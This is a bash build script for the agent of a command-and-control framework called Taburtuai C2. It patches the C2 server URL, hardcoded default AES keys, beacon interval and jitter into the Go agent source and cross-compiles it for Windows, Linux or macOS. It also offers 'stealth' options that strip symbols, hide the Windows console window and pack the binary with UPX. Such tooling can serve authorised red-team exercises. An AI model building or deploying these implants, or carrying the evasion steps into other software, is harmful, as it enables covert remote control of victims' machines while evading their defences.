#!/bin/bash

# Enhanced Agent Build Script for Taburtuai C2
set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Defaults
DEFAULT_SERVER_URL="http://127.0.0.1:8080"
DEFAULT_KEY="SpookyOrcaC2AES1"
DEFAULT_SECONDARY_KEY="TaburtuaiSecondary"
DEFAULT_INTERVAL="30"
DEFAULT_JITTER="0.3"

BUILD_DIR="./bin"
AGENT_DIR="./agent"

print_status() { echo -e "${BLUE}[INFO]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
print_error() { echo -e "${RED}[ERROR]${NC} $1"; }

show_usage() {
    cat << 'USAGE_EOF'
Enhanced Agent Build Script for Taburtuai C2

Usage: ./build_agent.sh [OPTIONS]

Options:
    -s, --server URL        C2 server URL (default: http://127.0.0.1:8080)
    -k, --key KEY          Primary encryption key (default: SpookyOrcaC2AES1)
    -i, --interval SEC     Beacon interval in seconds (default: 30)
    -j, --jitter FLOAT     Jitter factor 0.0-1.0 (default: 0.3)
    -o, --os TARGET        Target OS: windows, linux, darwin (default: current)
    -a, --arch ARCH        Target architecture: amd64, 386 (default: amd64)
    -n, --name NAME        Output filename (default: auto-generated)
    -S, --stealth          Enable stealth compilation options
    -c, --compress         Compress final binary with UPX
    -h, --help             Show this help message

Examples:
    # Build basic agent
    ./build_agent.sh

    # Build for Windows with custom server
    ./build_agent.sh -s http://192.168.1.100:8080 -o windows

    # Build with stealth options
    ./build_agent.sh -S -c -o windows
USAGE_EOF
}

prepare_source() {
    print_status "Preparing agent source code..."
    
    # Update main.go with configuration
    cp "$AGENT_DIR/main.go" "$AGENT_DIR/main.go.bak"
    
    if [[ "$OSTYPE" == "darwin"* ]]; then
        sed -i '' \
            -e "s|http://127.0.0.1:8080|$SERVER_URL|g" \
            -e "s|SpookyOrcaC2AES1|$KEY|g" \
            -e "s|TaburtuaiSecondary|$SECONDARY_KEY|g" \
            -e "s|\"30\"|\"$INTERVAL\"|g" \
            -e "s|\"0.3\"|\"$JITTER\"|g" \
            "$AGENT_DIR/main.go"
    else
        sed -i \
            -e "s|http://127.0.0.1:8080|$SERVER_URL|g" \
            -e "s|SpookyOrcaC2AES1|$KEY|g" \
            -e "s|TaburtuaiSecondary|$SECONDARY_KEY|g" \
            -e "s|\"30\"|\"$INTERVAL\"|g" \
            -e "s|\"0.3\"|\"$JITTER\"|g" \
            "$AGENT_DIR/main.go"
    fi
    
    print_success "Source code prepared"
}

build_agent() {
    print_status "Building enhanced agent..."
    
    if [ -z "$OUTPUT_NAME" ]; then
        OUTPUT_NAME="agent_${TARGET_OS}_${TARGET_ARCH}"
        if [ "$TARGET_OS" = "windows" ]; then
            OUTPUT_NAME="${OUTPUT_NAME}.exe"
        fi
    fi
    
    local ldflags=""
    if [ "$STEALTH" = true ]; then
        ldflags="-s -w"
        if [ "$TARGET_OS" = "windows" ]; then
            ldflags="$ldflags -H windowsgui"
        fi
        print_status "Stealth mode enabled"
    fi
    
    export GOOS="$TARGET_OS"
    export GOARCH="$TARGET_ARCH"
    export CGO_ENABLED=0
    
    print_status "Building for $TARGET_OS/$TARGET_ARCH..."
    
    cd "$AGENT_DIR"
    if go build -ldflags "$ldflags" -o "../$BUILD_DIR/$OUTPUT_NAME" .; then
        print_success "Agent built successfully: $BUILD_DIR/$OUTPUT_NAME"
    else
        print_error "Build failed"
        exit 1
    fi
    cd - > /dev/null
    
    # Restore original main.go
    mv "$AGENT_DIR/main.go.bak" "$AGENT_DIR/main.go"
}

compress_binary() {
    if [ "$COMPRESS" = true ]; then
        print_status "Compressing binary with UPX..."
        
        if command -v upx >/dev/null 2>&1; then
            if upx --best "$BUILD_DIR/$OUTPUT_NAME" 2>/dev/null; then
                print_success "Binary compressed"
            else
                print_warning "UPX compression failed"
            fi
        else
            print_warning "UPX not found, skipping compression"
        fi
    fi
}

parse_args() {
    # Set defaults
    SERVER_URL="$DEFAULT_SERVER_URL"
    KEY="$DEFAULT_KEY"
    SECONDARY_KEY="$DEFAULT_SECONDARY_KEY"
    INTERVAL="$DEFAULT_INTERVAL"
    JITTER="$DEFAULT_JITTER"
    TARGET_OS=$(go env GOOS 2>/dev/null || echo "linux")
    TARGET_ARCH="amd64"
    OUTPUT_NAME=""
    STEALTH=false
    COMPRESS=false
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -s|--server)
                SERVER_URL="$2"
                shift 2
                ;;
            -k|--key)
                KEY="$2"
                shift 2
                ;;
            -i|--interval)
                INTERVAL="$2"
                shift 2
                ;;
            -j|--jitter)
                JITTER="$2"
                shift 2
                ;;
            -o|--os)
                TARGET_OS="$2"
                shift 2
                ;;
            -a|--arch)
                TARGET_ARCH="$2"
                shift 2
                ;;
            -n|--name)
                OUTPUT_NAME="$2"
                shift 2
                ;;
            -S|--stealth)
                STEALTH=true
                shift
                ;;
            -c|--compress)
                COMPRESS=true
                shift
                ;;
            -h|--help)
                show_usage
                exit 0
                ;;
            *)
                print_error "Unknown option: $1"
                show_usage
                exit 1
                ;;
        esac
    done
}

main() {
    echo -e "${BLUE}"
    cat << 'HEADER_EOF'
╔══════════════════════════════════════════════════════════════════╗
║               Enhanced Agent Build Script v3.0                   ║
║                    Taburtuai C2 - Modular                        ║
╚══════════════════════════════════════════════════════════════════╝
HEADER_EOF
    echo -e "${NC}"
    
    parse_args "$@"
    
    # Check dependencies
    if ! command -v go >/dev/null 2>&1; then
        print_error "Go is not installed"
        exit 1
    fi
    
    # Create build directory
    mkdir -p "$BUILD_DIR"
    
    prepare_source
    build_agent
    compress_binary
    
    print_success "Build completed successfully!"
    echo ""
    echo -e "${GREEN}Output: $BUILD_DIR/$OUTPUT_NAME${NC}"
    echo -e "${BLUE}Server: $SERVER_URL${NC}"
    echo -e "${BLUE}Interval: ${INTERVAL}s (jitter: $JITTER)${NC}"
}

main "$@"
